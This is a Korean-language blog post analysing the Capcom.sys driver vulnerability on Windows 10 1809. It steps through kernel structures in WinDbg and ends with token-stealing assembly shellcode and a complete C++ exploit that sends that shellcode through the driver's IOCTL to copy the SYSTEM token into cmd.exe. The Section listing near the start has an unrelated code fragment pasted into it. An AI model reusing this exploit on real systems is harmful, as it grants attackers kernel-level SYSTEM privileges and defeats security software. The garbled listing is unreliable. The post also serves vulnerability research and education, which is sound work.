---
layout: article
title: "[Vuln]Capcom Driver Vulnerability"
key: 20191103
tags:
  - Kernel
  - Reversing
  - Windows
  - Vuln
toc: true
mathjax: true
mathjax_autoNumber: true
published : true
---

# [+] Capcom Driver Vulnerability

<!--more-->

## [+] Summary

약 3년전에 `Capcom` 드라이버 관련 된 버그가 공개됐었다. 내용인즉, 해당 드라이버를 이용하여 링0 권한으로 명령 실행이 가능하다는 점이었다. 이로인해 각종 안티치트 드라이버들이 무력화되는 현상도 있었으며 널리 악용되었었다.

어떠한 버그였는지 분석하고 관련 내용들을 정리한다.

## [+] Analysis

분석 환경은 다음과 같다.

- Windows 10, 1809(OS Build 17763.805), Virtual Machine

취약한 드라이버를 디스어셈블러를 이용하여 열어 함수 및 코드를 정리한다.

### [-] Function

```
sub_103AC	.text	00000000000103AC	000000D0	00000048	00000000	R	.	.	.	.	.	.
sub_1047C	.text	000000000001047C	00000065	00000038	00000000	R	.	.	.	.	.	.
sub_104E4	.text	00000000000104E4	0000003D	00000028	00000000	R	.	.	.	.	.	.
sub_10524	.text	0000000000010524	0000006B	00000048	00000008	R	.	.	.	.	.	.
sub_10590	.text	0000000000010590	000000AC	00000038	00000000	R	.	.	.	.	.	.
DriverEntry	.text	000000000001063C	0000011B	00000078	00000018	R	.	.	.	.	T	.
sub_10788	.text	0000000000010788	00000011	00000000	00000000	R	.	.	.	.	.	.
sub_107A0	.text	00000000000107A0	00000008	00000000	00000000	R	.	.	.	.	.	.
```

### [-] Section

```
HEADER	0000000000010000	0000000000010300	?	?	?	.	L	page	0002	public	DATA	64	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF
.idata	0000000000010300	0000000000010340	R	.	X	.	L	para	0001	public	CODE	64	0000	0000	0003	FFFFFFFFFFFFFFFF	FFFFFFFFFFFFFFFF

		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);
		*(PULONG_PTR)(inBuffer + 8) = 0xCCCCCCCCCCCCCCCC;

		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);

		if (DeviceIoControl(driver, dwIoCtlCode, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
		{
			fprintf(stdout, "Call DeviceIoControl\n"); 
			system("pause");
		}
		else {
			fprintf(stderr, "Call DeviceIoControl Failed\n");
			system("pause");
		}
		CloseHandle(driver);
	}
}
```

코드가 실행되는 `inBuffer` 위치에 `int3(0xcc)` 를 잔뜩 꾸겨넣었다. 이제 디버거에서 실제 실행했을 때 코드가 잘 실행되는지 확인한다.

자 블루스크린은 이쁘게 켜졌고, 콜 스택을 확인해본다.

```
 # Child-SP          RetAddr           Call Site
00 fffffe81`a82bec38 fffff807`150a0da2 nt!DbgBreakPointWithStatus
01 fffffe81`a82bec40 fffff807`150a0527 nt!KiBugCheckDebugBreak+0x12
02 fffffe81`a82beca0 fffff807`14fc4157 nt!KeBugCheck2+0x957
03 fffffe81`a82bf3c0 fffff807`14fd58e9 nt!KeBugCheckEx+0x107
04 fffffe81`a82bf400 fffff807`14fd1cd4 nt!KiBugCheckDispatch+0x69
05 fffffe81`a82bf540 00000222`a10d0008 nt!KiPageFault+0x454
06 fffffe81`a82bf6d8 fffff807`140e0577 0x00000222`a10d0008
07 fffffe81`a82bf6e0 fffff807`140e0613 Capcom+0x577
```

`BugCheck` 함수가 호출되기 전을 보면 되는데, `0x222a10d0008` 위치에서 예외가 발생한 것으로 보인다. 해당 위치의 메모리를 본다.

```
2: kd> dq 0x00000222`a10d0008
00000222`a10d0008  cccccccc`cccccccc 00000000`00000000
00000222`a10d0018  00000000`00000000 00000000`00000000
00000222`a10d0028  00000000`00000000 00000000`00000000
00000222`a10d0038  00000000`00000000 00000000`00000000
00000222`a10d0048  00000000`00000000 00000000`00000000
00000222`a10d0058  00000000`00000000 00000000`00000000
00000222`a10d0068  00000000`00000000 00000000`00000000
00000222`a10d0078  00000000`00000000 00000000`00000000
2: kd> u 0x00000222`a10d0008
00000222`a10d0008 cc              int     3
00000222`a10d0009 cc              int     3
00000222`a10d000a cc              int     3
00000222`a10d000b cc              int     3
00000222`a10d000c cc              int     3
00000222`a10d000d cc              int     3
00000222`a10d000e cc              int     3
00000222`a10d000f cc              int     3
```

아름답게 코드가 저장되어 있으며 실행을 했다. 링0의 권한을 가지고 있는 이 취약한 드라이버를 이용하여 이제 무엇이든 될 수 있게 되었다.

## [+] Ready

### [-] Get Started

토큰을 훔치는 이유는 당연히 Windows에서 가장 높은 권한인 `System`의 권한을 획득하기 위함이다. 이걸로 무엇을 할 수 있을지는 너무 방대해서 상상조차 어렵다.
검색하고 찾아본 내용에서 링0 영역의 권한을 갖는데 많이 사용되는 기법이 토큰 탈취라고 한다.

`System` 프로세스의 토큰을 훔치는 것은 대통령의 얼굴 사진과 이름을 잘라내어 내 신분증에 붙여넣는 것과 같다는 문구가 인상적이다.

그러기 위해서 먼저 필요한 과정은 코드 실행이 가능한 취약점을 찾아야 하는 것이다. 해당 위치에서 토큰을 훔치는 코드를 작성하고 해당 권한으로 쉘을 실행하면 된다는 이야기다.

그러기 위해 알아야 하는 구조체는 다음과 같다.

1. `KPCR` 
2. `KPRCB`
3. `KTHREAD`
4. `KAPC` 
5. `EPROCESS`

POC에 사용한 OS 정보는 다음과 같다.

- Windows 10, 1809(OS Build 17763.805)

내 블로그  <a href="https://shhoya.github.io/2019/06/03/WindowsK.html#-kernel-processor-control-region">포스트</a> 에 `KPCR` 관련 내용이 약간있다. `SSDT` 공부를 하다가 적어놨는데 해당 내용에도 토큰 탈취에 사용되고 있다라는 이야기가 적혀있다. 여기서 상세하게 다루게 되니 재밌다.

여기서 중요 포인트는 `KPCR`은 프로세서의 정보를 가지고 있는 구조체인데,  이에 접근하기 위해서는 `gs:[0]`을 이용하기 때문에 접근이 편리하다.

 우선 `KPCR`에서부터 토큰을 찾아가는 과정을 본다.

#### 1. KPCR

```
0: kd> dt_KPCR
ntdll!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
   +0x008 TssBase          : Ptr64 _KTSS64
   +0x010 UserRsp          : Uint8B
   +0x018 Self             : Ptr64 _KPCR
   +0x020 CurrentPrcb      : Ptr64 _KPRCB
   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : Ptr64 Void
   +0x038 IdtBase          : Ptr64 _KIDTENTRY64
   +0x040 Unused           : [2] Uint8B
   +0x050 Irql             : UChar
   +0x051 SecondLevelCacheAssociativity : UChar
   +0x052 ObsoleteNumber   : UChar
   +0x053 Fill0            : UChar
   +0x054 Unused0          : [3] Uint4B
   +0x060 MajorVersion     : Uint2B
   +0x062 MinorVersion     : Uint2B
   +0x064 StallScaleFactor : Uint4B
   +0x068 Unused1          : [3] Ptr64 Void
   +0x080 KernelReserved   : [15] Uint4B
   +0x0bc SecondLevelCacheSize : Uint4B
   +0x0c0 HalReserved      : [16] Uint4B
   +0x100 Unused2          : Uint4B
   +0x108 KdVersionBlock   : Ptr64 Void
   +0x110 Unused3          : Ptr64 Void
   +0x118 PcrAlign1        : [24] Uint4B
   +0x180 Prcb             : _KPRCB
```

위와 같이 이루어져있으며 맨 마지막 +180h에 `KPRCB` 구조체가 존재한다.

#### 2. KPRCB

```
0: kd> dt_KPRCB
ntdll!_KPRCB
   +0x000 MxCsr            : Uint4B
   +0x004 LegacyNumber     : UChar
   +0x005 ReservedMustBeZero : UChar
   +0x006 InterruptRequest : UChar
   +0x007 IdleHalt         : UChar
   +0x008 CurrentThread    : Ptr64 _KTHREAD
   +0x010 NextThread       : Ptr64 _KTHREAD
   +0x018 IdleThread       : Ptr64 _KTHREAD
```

해당 구조체의 0x08 에는 `KTHREAD` 구조체가 존재한다. 여기까지 접근하기 위해 다음과 같은 방법을 사용할 수 있을 것이다. `gs:[0](KPCR)` + `0x180(KPRCB)` +  `0x8(KTHREAD)` 으로 접근이 가능할 것이다. 여기까지 한번 정말 그런지 확인해본다.

```
0: kd> dg gs
                                                    P Si Gr Pr Lo
Sel        Base              Limit          Type    l ze an es ng Flags
---- ----------------- ----------------- ---------- - -- -- -- -- --------
002B fffff807`5d430000 00000000`ffffffff Data RW Ac 3 Bg Pg P  Nl 00000cf3
```

`gs:[0]` 은 `fffff807'5d430000` 이다. 

```
0: kd> dt_KPCR fffff807`5d430000
ntdll!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : 0xfffff807`60e6efb0 _KGDTENTRY64
   +0x008 TssBase          : 0xfffff807`60e6d000 _KTSS64
   +0x010 UserRsp          : 0
   +0x018 Self             : 0xfffff807`5d430000 _KPCR
   +0x020 CurrentPrcb      : 0xfffff807`5d430180 _KPRCB
   +0x028 LockArray        : 0xfffff807`5d430870 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : 0x00000000`005d1000 Void
   +0x038 IdtBase          : 0xfffff807`60e6c000 _KIDTENTRY64
   +0x040 Unused           : [2] 0
   +0x050 Irql             : 0 ''
   +0x051 SecondLevelCacheAssociativity : 0xc ''
   +0x052 ObsoleteNumber   : 0 ''
   +0x053 Fill0            : 0 ''
   +0x054 Unused0          : [3] 0
   +0x060 MajorVersion     : 1
   +0x062 MinorVersion     : 1
   +0x064 StallScaleFactor : 0x8a0
   +0x068 Unused1          : [3] (null) 
   +0x080 KernelReserved   : [15] 0
   +0x0bc SecondLevelCacheSize : 0x900000
   +0x0c0 HalReserved      : [16] 0x839b6800
   +0x100 Unused2          : 0
   +0x108 KdVersionBlock   : (null) 
   +0x110 Unused3          : (null) 
   +0x118 PcrAlign1        : [24] 0
   +0x180 Prcb             : _KPRCB
```

```
5: kd> dt_KPRCB fffff807`5d430000+180
ntdll!_KPRCB
   +0x000 MxCsr            : 0x1f80
   +0x004 LegacyNumber     : 0 ''
   +0x005 ReservedMustBeZero : 0 ''
   +0x006 InterruptRequest : 0 ''
   +0x007 IdleHalt         : 0x1 ''
   +0x008 CurrentThread    : 0xfffff807`5eb6b400 _KTHREAD
   +0x010 NextThread       : (null) 
   +0x018 IdleThread       : 0xfffff807`5eb6b400 _KTHREAD
   +0x020 NestingLevel     : 0 ''
   +0x021 ClockOwner       : 0x1 ''
   +0x022 PendingTickFlags : 0x1 ''
...
```

현재 스레드의 `KTHREAD` 구조체의 주소는 `fffff807'5eb6b400` 이다. 이 값은 메모리에서 확인하면 `gs:[188h]` 의 값임을 확인할 수 있다.

```
5: kd> dq fffff807`5d430000+180
fffff807`5d430180  01000000`00001f80 fffff807`5eb6b400
fffff807`5d430190  00000000`00000000 fffff807`5eb6b400
fffff807`5d4301a0  00000000`00010100 fffff807`60e79c10
fffff807`5d4301b0  00000000`00000000 fffff807`5d436910
fffff807`5d4301c0  000008a0`9e0a0106 00000000`00000000
```

그럼 위에서 말한 `gs:[188h]` 의 값이 현재 스레드의 `KTHREAD` 구조체임이 확인되었다.

#### 3. KTHREAD

중요한 `KTHREAD` 구간이 나왔다.

```
5: kd> dt_KTHREAD fffff807`5eb6b400
ntdll!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x791ddc0
   +0x028 InitialStack     : 0xfffff807`60e79c10 Void
   +0x030 StackLimit       : 0xfffff807`60e73000 Void
   +0x038 StackBase        : 0xfffff807`60e7a000 Void
   +0x040 ThreadLock       : 0
   +0x048 CycleTime        : 0x00000460`ffb4c06a
   +0x050 CurrentRunTime   : 0xffffffff
   +0x054 ExpectedRunTime  : 0
   +0x058 KernelStack      : 0xfffff807`60e79ba0 Void
   +0x060 StateSaveArea    : 0xfffff807`60e79c40 _XSAVE_FORMAT
   +0x068 SchedulingGroup  : (null) 
   +0x070 WaitRegister     : _KWAIT_STATUS_REGISTER
...
   +0x098 ApcState         : _KAPC_STATE
   +0x098 ApcStateFill     : [43]  "???"
...
   +0x21c QueuePriority    : 0n0
   +0x220 Process          : 0xfffff807`5eb689c0 _KPROCESS
...
```

큰 구조체를 지니고 있다. 중요한건 0x98 위치의 `KAPC_STATE` 구조체이다. 그리고 아래 0x220에 있는 `KPROCESS` 구조체를 보고 생각을 해봐야한다. 우리는 `System` 계정의 토큰을 탈취하려 한다. 그러기 위해 `EPROCESS` 구조체에 접근해야 한다.

나는 왜 저기 떡하니 프로세스 구조체가 있는데 `KAPC_STATE`를 봐야하는지 의아했다. 그래서 해당 프로세스 구조체를 확인해봤다.

```
5: kd> dt_EPROCESS 0xfffff807`5eb689c0
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : (null) 
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   +0x2f8 RundownProtect   : _EX_RUNDOWN_REF
   +0x300 Flags2           : 0x8000
...
   +0x450 ImageFileName    : [15]  "Idle"
```

바로 PID 0의 `Idle` 프로세스에 대한 구조체임을 확인할 수 있다. 우리가 탈취하려는 프로세스 토큰은 `System`이다.  찾아보면 `Idle` 프로세스를 찾는 내용의 글들도 있던데 한번 살펴봐야겠다 '왜' 찾는지...

어쨋든 그렇기 때문에 `KAPC_STATE`를 이용해야 한다.

#### 4. KAPC_STATE

```
0: kd> dt_KAPC_STATE
ntdll!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY
   +0x020 Process          : Ptr64 _KPROCESS
   +0x028 InProgressFlags  : UChar
   +0x028 KernelApcInProgress : Pos 0, 1 Bit
   +0x028 SpecialApcInProgress : Pos 1, 1 Bit
   +0x029 KernelApcPending : UChar
   +0x02a UserApcPendingAll : UChar
   +0x02a SpecialUserApcPending : Pos 0, 1 Bit
   +0x02a UserApcPending   : Pos 1, 1 Bit
```

매우 간략한 정보를 가지고 있다. 여기서 중요한건 +0x20 위치에 `KPROCESS` 구조체이다.
`KAPC_STATE`는 `EPROCESS`와 관련되어 있으며 `KTHREAD`의 일부분이다라고 `geoff chappell` 에 정의되어 있다. 어렵다 어쨋든 위에서 얻은 정보를 토대로 접근하면 아래와 같다.

```
0: kd> dx -id 0,0,ffff920ea3a722c0 -r1 (*((ntdll!_KAPC_STATE *)0xfffff8075eb6b498))
(*((ntdll!_KAPC_STATE *)0xfffff8075eb6b498))                 [Type: _KAPC_STATE]
    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]
    [+0x020] Process          : 0xffff920ea3a722c0 [Type: _KPROCESS *]
    [+0x028] InProgressFlags  : 0x0 [Type: unsigned char]
    [+0x028 ( 0: 0)] KernelApcInProgress : 0x0 [Type: unsigned char]
    [+0x028 ( 1: 1)] SpecialApcInProgress : 0x0 [Type: unsigned char]
    [+0x029] KernelApcPending : 0x0 [Type: unsigned char]
    [+0x02a] UserApcPendingAll : 0x0 [Type: unsigned char]
    [+0x02a ( 0: 0)] SpecialUserApcPending : 0x0 [Type: unsigned char]
    [+0x02a ( 1: 1)] UserApcPending   : 0x0 [Type: unsigned char]
```

#### 5. EPROCESS

프로세스 구조체는 `0xffff920ea3a722c0`에 위치한다. 이제 `EPROCESS` 구조체와 매핑하면 아래와 같이 `System` 프로세스임을 알 수 있다.

```
0: kd> dt_EPROCESS 0xffff920ea3a722c0 
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff920e`a3a92368 - 0xfffff807`5ea1a560 ]
  ...
   +0x358 Token            : _EX_FAST_REF
  ...
   +0x450 ImageFileName    : [15]  "System"
```

위에 중요한 정보는 모두 존재한다. `System` 프로세스를 찾기 위한 `ActiveProcessLinks`와 `UniqueProcessId`는 8바이트 차이가 존재하고, 탈취하려는 토큰의 정보는 `EPROCESS`+0x358에 존재한다.

`Token`에 멤버의 `_EX_FAST_REF` 라는 설명이 중요하다. 이 값을 보면 `!process`로 확인한 토큰 값과 다르다는 것을 알 수 있다.

```
PROCESS ffff920ea3a722c0
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad002  ObjectTable: ffffdd0781209c40  HandleCount: 2666.
    Image: System
    VadRoot ffff920ea3a5d6a0 Vads 8 Clone 0 Private 21. Modified 26258. Locked 0.
    DeviceMap ffffdd07812134e0
    Token                             ffffdd078120b700
```

`!process` 명령으로 확인한 토큰 값은 `0xffffdd078120b700` 이다. 그러나 구조체를 따라가 확인하면 아래와 같은 값이 나온다.

```
0: kd> dt_EPROCESS -y Token 0xffff920ea3a722c0
ntdll!_EPROCESS
   +0x358 Token : _EX_FAST_REF
0: kd> dx -id 0,0,ffff920ea3a722c0 -r1 (*((ntdll!_EX_FAST_REF *)0xffff920ea3a72618))
(*((ntdll!_EX_FAST_REF *)0xffff920ea3a72618))                 [Type: _EX_FAST_REF]
    [+0x000] Object           : 0xffffdd078120b70f [Type: void *]
    [+0x000 ( 3: 0)] RefCnt           : 0xf [Type: unsigned __int64]
    [+0x000] Value            : 0xffffdd078120b70f [Type: unsigned __int64]
```

해당 내용을 확인하면 `0xffffdd078120b70f` 이 토큰 값으로 설정되어 있다. 정확히 어떤 계산인지는 모르지만 구하는 공식은 아래와 같다.

```
0: kd> ? poi(0xffff920ea3a722c0+358)&fffffffffffffff0
Evaluate expression: -38450675796224 = ffffdd07`8120b700
```

주소 값으로 예상되어 아래와 같이 토큰에 대한 구조체를 확인해봤다.

#### 6. Token

```
0: kd> dt_Token ffffdd07`8120b700
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER 0x06207526`b64ceb90
   +0x030 TokenLock        : 0xffff920e`a3aabc50 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : 0
   +0x07c UserAndGroupCount : 5
   +0x080 RestrictedSidCount : 0
   +0x084 VariableLength   : 0xa4
   +0x088 DynamicCharged   : 0x1000
  
0: kd> dx -id 0,0,ffff920ea3a722c0 -r1 (*((ntkrnlmp!_TOKEN_SOURCE *)0xffffdd078120b700))
(*((ntkrnlmp!_TOKEN_SOURCE *)0xffffdd078120b700))                 [Type: _TOKEN_SOURCE]
    [+0x000] SourceName       : "*SYSTEM*" [Type: char [8]]
    [+0x008] SourceIdentifier [Type: _LUID]

```

얼추 구조체가 맞는 듯 하다. `TOKEN_SOURCE` 구조체를 확인하면 `SourceName`에 `SYSTEM`으로 잘 들어가있는 것을 확인할 수 있다.

### [-] Get  Token

위에서 토큰에 접근하는 과정을 알아봤다. 그럼 실제로 어떻게 쉘 코드를 구성해야 할지 고민해봐야한다.

익스플로잇 순서는 다음과 같다고 한다.

1. `KTHREAD`와 `EPROCESS` 포인터 값 획득
2. `EPROCESS` 내 `ActiveProcessLinks(LIST_ENTRY)`를 따라 `UniqueProcessId` 가 `4(System)` 인 `EPROCESS` 구조체 포인터 획득
3. 토큰을 저장
4. `cmd.exe`에 대한 `EPROCESS` 구조체 포인터 획득
5. 해당 구조체의 `Token` 값을 `System` 토큰 값으로 Overwrite

#### 1. Get KTHREAD, EPROCESS pointer

`KPCR(gs:[0])` 을 기준으로 모두 가능한 행위다.
`KTHREAD` 는 확인한 바와 같이 `gs:[188h]` 위치에 존재한다. 

`KPCR + 0x180 = KPRCB`
`KPRCB + 0x8 = CurrentThread(KTHREAD)`

그리고 `EPROCESS` 를 찾아야 하는데, 이 때 `KAPC_STATE(KTHREAD+0x98)`를 이용한다고 했다. 이를 어셈블리로 표현하면 다음과 같이 표현할 수 있다.

```
MOV rcx, [gs:188h]	; Get KTHREAD pointer
MOV rdx, [rdx+B8h]	; Get EPROCESS pointer 
```

`KTHREAD` 값에 `+B8h`를 한 이유는 프로세스 구조체가 `KAPC_STATE`로 부터 0x20만큼 떨어진 위치에 존재하기 때문이다. 

#### 2. Get EPROCESS Pointer(System)

`EPROCESS` 구조체 내에 있는 `ActiveProcessLinks`를 이용하여 프로세스들을 탐색한다. 
`ActiveProcessLinks`는 이름대로 연결리스트로 구성되어 있는데, 이 때 `Flink`를 이용하여 프로세스를 탐색할 수 있다.

현재 `rdx` 레지스터에는 `EPROCESS`의 포인터가 담겨있다. 이를 이용하면 쉽게 원하는 프로세스의 구조체를 찾을 수 있다.

```
3: kd> dt_EPROCESS 0xffff970aaf260300
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff970a`af310368 - 0xfffff803`1e8c1560 ]
```

우리가 필요한건 `UniqueProcessId`와 `ActiveProcessLinks`이다. 먼저 `ActiveProcessLinks`의 head를 가져오고, 이 값으로부터 -0x8의 위치에 있는 PID를 가져와 비교를 하면 된다. `System` 프로세스가 아닌 경우, `ActiveProcessLinks`의 `Flink`를 가져와 다음 프로세스와 비교하는 구문을 만들면 되는 것이다.

```
MOV r8, [rdx+2e8h]	; ActiveProcessLinks List Head
MOV rcx, [r8]	; First process in List

find_system:
	MOV rdx, [rcx-8]	; UniqueProcessId
	CMP rdx, 4	; if System Process
	JZ GetToken
	MOV rcx, [rcx]	; if not System Process, Next process List
	JMP find_system	; Loop
```

`ActiveProcessLinks`를 찾게 되면 이전에 찾은 `KTHREAD`, `EPROCESS` 포인터가 없어도 오프셋 놀이를 통해 모두 접근이 가능하기 때문에 `rcx`와 `rdx` 레지스터를 임시 레지스터로 사용했다. `LIST_ENTRY` 구조체에 대해서는 검색해보면 `DKOM` 기법 관련하여 많이 나오기도 하고, 직접 눈으로 보는걸 추천한다.

#### 3. Get "System" Process Token

`System` 프로세스를 찾았다면 이제 해당 권한의 토큰을 가져와야 한다. 프로세스 구조체를 찾았으니 쉽게 토큰 값을 저장할 수 있다.

먼저 계산을 해보자. 현재 `rcx`는 `System` 프로세스의 `EPROCESS` 구조체 중 `ActiveProcessLinks` 값을 갖고 있다. `Token` 멤버의 경우 `0x358` 위치에 존재하므로 `0x358 - 0x2e8`을 하게 되면 `rcx+70h` 으로 토큰 값을 가져올 수 있다.

```
GetToken:
	MOV rax, [rcx+70h]	; Move token
	AND al, 0f0h	; Clear low 4bits
```

위에서 얘기했던 연산부분이다. 결론적으로 마지막 4bit를 버리는 연산이었다. rax의 하위 4비트를 가져와 `f0`으로 AND연산하여 버리게 된다.

이렇게하면 정확한 프로세스의 토큰 값을 얻을 수 있으며, 이제 `RAX` 레지스터에 `System` 프로세스의 토큰 값이 저장되어 있다.

그 이후에는 `cmd` 나 내가 원하는 프로세스를 2번의 과정을 반복하여 찾고, 해당 토큰 값을 저장해주면 끝이다.
4,5번은 생략한다.

이를 쉘 코드를 작성하면 다음과 같이 볼 수 있다.

```
start:
	MOV rcx, [gs:188h]	; Get KTHREAD pointer
	MOV rdx, [rdx+B8h]	; Get EPROCESS pointer 
	MOV r8, [rdx+2e8h]	; ActiveProcessLinks List Head
	MOV rcx, [r8]	; First process in List

find_system:
	MOV rdx, [rcx-8]	; UniqueProcessId
	CMP rdx, 4	; if System Process
	JZ GetToken
	MOV rcx, [rcx]	; if not System Process, Next process List
	JMP find_system	; Loop
GetToken:
	MOV rax, [rcx+70h]   ;offset to token
	AND al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
	
find_cmd:
    MOV rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
    CMP rdx, <PID>       ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
    JZ CopyToken         ;YES - move on
    MOV rcx, [rcx]       ;NO - next entry in list
    JMP find_cmd         ;loop
CopyToken:
    MOV [rcx+70h], rax   ;copy SYSTEM token over top of this process's token
return:
    add rsp, 28h         ;HEVD+0x61ea
    ret
```

위의 쉘 코드는 `HEVD` 라는 취약점 PoC를 위한 드라이버를 토대로 짜여진 쉘 코드다. 개념을 잡기 위한 내용일뿐이며 실제 익스플로잇에서는 다른 쉘 코드를 사용해야 한다.

## [+] Exploit

우선 내 머리로 짠 익스 코드다.

```c++
#include <stdio.h>
#include <Windows.h>

int main()
{

	BYTE ShellCode[] = { 
		0x51,
		0x52,
		0x41,0x50,
		0x41,0x51,
		0x65,0x48,0x8B,0x0C,0x25,0x88,0x01,0x00,0x00,
		0x48,0x8B,0x91,0xB8,0x00,0x00,0x00,
		0x4C,0x8B,0x82,0xE8,0x02,0x00,0x00,
		0x49,0x8B,0x08,
		0x48,0x8B,0x51,0xF8,
		0x48,0x83,0xFA,0x04,
		0x74,0x05,
		0x48,0x8B,0x09,
		0xEB,0xF1,
		0x48,0x8B,0x41,0x70,
		0x24,0xF0,
		0x48,0x8B,0x09,
		0x4C,0x8D,0x81,0x68,0x01,0x00,0x00,
		0x45,0x8A,0x08,
		0x41,0x80,0xF9,0x63,
		0x75,0xED,
		0x45,0x8A,0x48,0x01,
		0x41,0x80,0xF9,0x6D,
		0x75,0xE3,
		0x45,0x8A,0x48,0x02,
		0x41,0x80,0xF9,0x64,
		0x75,0xD9,
		0xEB,0x00,
		0x48,0x89,0x41,0x70,
		0x41,0x59,
		0x41,0x58,
		0x5A,
		0x59,
		0xC3 
	};
	/*
	push rcx
	push rdx
	push r8
	push r9
	mov rcx,qword ptr gs:[188]
	mov rdx,qword ptr ds:[rdx+B8]
	mov r8,qword ptr ds:[rdx+2E8]
	mov rcx,qword ptr ds:[r8]
	mov rdx,qword ptr ds:[rcx-8]
	cmp rdx,4
	je <capcomexp.GetToken>
	mov rcx,qword ptr ds:[rcx]
	jmp <capcomexp.FindProcess>
	mov rax,qword ptr ds:[rcx+70]
	and al,F0
	mov rcx,qword ptr ds:[rcx]
	lea r8,qword ptr ds:[rcx+168]
	mov r9b,byte ptr ds:[r8]
	cmp r9b,63
	jne <capcomexp.Find_Cmd>
	mov r9b,byte ptr ds:[r8+1]
	cmp r9b,6D
	jne <capcomexp.Find_Cmd>
	mov r9b,byte ptr ds:[r8+2]
	cmp r9b,64
	jne <capcomexp.Find_Cmd>
	jmp <capcomexp.CopyToken>
	mov qword ptr ds:[rcx+70],rax
	pop r9
	pop r8
	pop rdx
	pop rcx
	ret
*/
	const wchar_t* deviceName = L"\\\\.\\Htsysm72FB";

	const DWORD dwIoCtlCode = 0xAA013044;
	HANDLE driver = CreateFile(deviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (driver == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "Unable to access device driver\n");
		system("pause");
	}

	else {
		fprintf(stdout, "Device Handle : %p\n", driver);
		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 105, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		fprintf(stdout, "inBuffer : %p\n", inBuffer);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;


		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8);
		fprintf(stdout, "inBuffer = %p %p\n", inBuffer, *inBuffer);
		memcpy(inBuffer + 8, ShellCode, 105);
		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8);

		if (DeviceIoControl(driver, dwIoCtlCode, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
		{
			fprintf(stdout, "Call DeviceIoControl\n"); 
			system("pause");
		}
		else {
			fprintf(stderr, "Call DeviceIoControl Failed\n");
			system("pause");
		}

		CloseHandle(driver);
	}
}
```

망나니 처럼 길다. 첫번째 나는 `InheritedFromUniqueProcessId`에 대한 존재를 몰랐다. 이는 부모의 PID를 의미하는 듯하다. 나는 콘솔 프로그램을 찾을 때, 아스키 문자를 통해 한글자씩 비교하여 토큰 값을 복사했다. 그러나 `InheritedFromUniqueProcessId`를 이용하면 그럴 필요가 없다.

디버깅을 해보면 처음 구하는 `EPROCESS` 구조체의 주인이 익스플로잇 프로그램이기 때문이다.

```
4: kd> dt_EPROCESS @rdx
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2d8 ProcessLock      : _EX_PUSH_LOCK
   +0x2e0 UniqueProcessId  : 0x00000000`0000095c Void
   +0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xfffff806`05228560 - 0xffff8d85`a4b1a368 ]
...
   +0x3e0 InheritedFromUniqueProcessId : 0x00000000`0000233c Void
...
   +0x450 ImageFileName    : [15]  "CapcomExp.exe"
```

여기서 `InheritedFromUniqueProcessId`를 저장하고 있다가 이후에 루프문을 통해 해당 값과 동일한 `UniqueProcessId`를 찾으면 그게 `CMD` 다.

계속 작성중...

## [+] Tip

`dg gs` 명령을 쳤을 때 Base가 0으로 나오는 경우가 존재한다. 중국어라 설명이 어렵고... 번역을 해보니 `gs`의 내용이 `MSR(Model-Specific Registers)` 로 이동되어 그런다고 한다. 그러니 `rdmsr 0xC0000101` 명령을 치면 `msr[c0000101]` 의 값이 나오고 이 값이 `gs:[0]` 인 `KPCR`의 주소 값이다.

